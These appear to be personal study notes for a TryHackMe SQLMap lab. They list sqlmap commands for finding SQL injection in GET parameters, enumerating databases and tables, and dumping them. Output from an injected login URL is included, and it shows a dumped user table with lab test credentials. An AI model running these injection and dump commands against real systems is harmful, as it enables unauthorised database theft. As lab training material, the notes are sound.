#SQL #SQLi  #Subscribers 

https://tryhackme.com/r/room/sqlmapthebasics

```
sqlmap --wizard

--dbs    extract all database names 
-D database_name --table
-D database_name -T table_name --dump

sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables
```

url ` http://sqlmaptesting.thm/search?cat=1 `
uses cat 

if web app uses GET parameter in the URL for data add `-u` in sqlmap 

<span style="color:#a0f958">URLs that have GET parameters can be vulnerable to SQL injection</span>
- different types of SQL injection, such as boolean-based blind, error-based, time-based blind, and UNION query, are identified in the target URL.
- 
```
website = sqlmap -u http://sqlmaptesting.thm/search/cat=1

1. sqlmap -u website --dbs
2. sqlmap -u website -D users --tables
3. sqlmap -u website -D users -T thomas --dump

+---------------------+------------+---------+ 
| Date                | name       | pass    | 
+---------------------+------------+---------- 
| 09/09/2024          | Thomas THM | testing | 
+---------------------+------------+---------+

```

to get the complete URL along with its GET parameters, we need to right-click on the login page and click the inspect option (the process may vary slightly from browser to browser). From here, we have to select the Network tab; then we have to enter some test credentials in the username and password fields and click the login button, and we will be able to see the GET request. Click on that request, and we can see the complete GET request with the parameters. We can copy this complete URL and use it with the SQLMap tool to discover SQL injection vulnerabilities inside it and exploit it.

```
Network tab > test : test 

http://10.10.40.152/ai/includes/user_login?email=test&password=test

sqlmap -u 'http://10.10.40.152/ai/includes/user_login?email=test&password=test' --dbs --level=5

questions: y, y, y, y, 'email' no

available databases [6]:
[*] ai
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

What is the name of the table available in the "ai" database?

sqlmap -u "http://10.10.40.152/ai/includes/user_login?email=test&password=test" -D ai -T user --dump -level=5

Database: ai
Table: user
[1 entry]
+------+-----------------+---------------------+------------+
| id   | email           | created             | password   |
+------+-----------------+---------------------+------------+
| 1    | test@chatai.com | 2023-02-21 09:05:46 | 12345678   |
+------+-----------------+---------------------+------------+

[INFO] table 'ai.`user`' dumped to CSV file '/root/.sqlmap/output/10.10.40.152/dump/ai/user.csv'
[INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.40.152'

```

